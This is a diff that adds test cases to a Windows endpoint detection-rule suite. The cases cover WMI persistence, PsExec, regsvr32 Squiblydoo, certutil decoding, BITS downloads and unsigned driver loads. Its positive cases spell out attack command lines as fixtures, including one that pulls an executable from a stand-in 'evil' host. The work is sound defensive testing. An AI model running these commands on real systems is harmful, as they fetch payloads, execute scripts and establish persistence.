@@ -379,6 +379,109 @@ CASES = [
     ("SYS-060", True, event(17, PipeName=r"\msagent_4f")),
     ("SYS-060", True, event(17, PipeName=r"\postex_1a2b")),
     ("SYS-060", False, event(17, PipeName=r"\lsass")),
+    # --- WMI persistence: command-line staging (SYS-070) ---
+    (
+        "SYS-070",
+        True,
+        event(1, command_line=r"mofcomp.exe C:\Temp\evilsub.mof"),
+    ),
+    (
+        "SYS-070",
+        True,
+        event(
+            1,
+            command_line=r"wmic /namespace:\\root\subscription PATH __EventFilter CREATE",
+        ),
+    ),
+    ("SYS-070", False, event(1, command_line=r"wmic os get caption")),
+    # --- WMI persistence: consumer registration (SYS-071) ---
+    ("SYS-071", True, event(20, Type="CommandLineEventConsumer")),
+    ("SYS-071", True, event(20, Type="ActiveScriptEventConsumer")),
+    ("SYS-071", False, event(20, Type="LogFileEventConsumer")),
+    # --- PsExec named pipe (SYS-072) ---
+    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC")),
+    ("SYS-072", True, event(17, PipeName=r"\PSEXESVC-1a2b-stdin")),
+    ("SYS-072", False, event(17, PipeName=r"\lsass")),
+    # --- PsExec service execution (SYS-073) ---
+    (
+        "SYS-073",
+        True,
+        event(1, image=r"C:\Windows\PSEXESVC.exe", command_line="PSEXESVC.exe"),
+    ),
+    (
+        "SYS-073",
+        True,
+        event(
+            1,
+            image=r"C:\Tools\psexec.exe",
+            command_line=r"psexec.exe -accepteula \\HOST cmd.exe",
+        ),
+    ),
+    (
+        "SYS-073",
+        False,
+        event(1, image=r"C:\Tools\psexec.exe", command_line=r"psexec.exe \\HOST cmd.exe"),
+    ),
+    # --- Regsvr32 Squiblydoo via scrobj.dll, independent of SYS-003 (SYS-074) ---
+    (
+        "SYS-074",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\regsvr32.exe",
+            command_line=r"regsvr32.exe /s /u /i:evil.sct scrobj.dll",
+        ),
+    ),
+    (
+        "SYS-074",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\regsvr32.exe",
+            command_line=r"regsvr32.exe C:\Program Files\App\legit.dll",
+        ),
+    ),
+    # --- Certutil decode/encode, distinct from SYS-003's download check (SYS-075) ---
+    (
+        "SYS-075",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\certutil.exe",
+            command_line=r"certutil.exe -decode payload.b64 payload.exe",
+        ),
+    ),
+    (
+        "SYS-075",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\certutil.exe",
+            command_line=r"certutil.exe -hashfile C:\a.txt SHA256",
+        ),
+    ),
+    # --- Start-BitsTransfer cmdlet, distinct from SYS-003's bitsadmin check (SYS-076) ---
+    (
+        "SYS-076",
+        True,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=r"Start-BitsTransfer -Source http://evil/x.exe -Destination x.exe",
+        ),
+    ),
+    (
+        "SYS-076",
+        False,
+        event(
+            1,
+            image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            command_line=r"Get-Process",
+        ),
+    ),
+    # --- Unsigned driver load / BYOVD (SYS-077) ---
+    ("SYS-077", True, event(6, ImageLoaded=r"C:\Windows\Temp\rtcore64.sys", Signed="false")),
+    ("SYS-077", False, event(6, ImageLoaded=r"C:\Windows\System32\drivers\ndis.sys", Signed="true")),
 ]
 
 
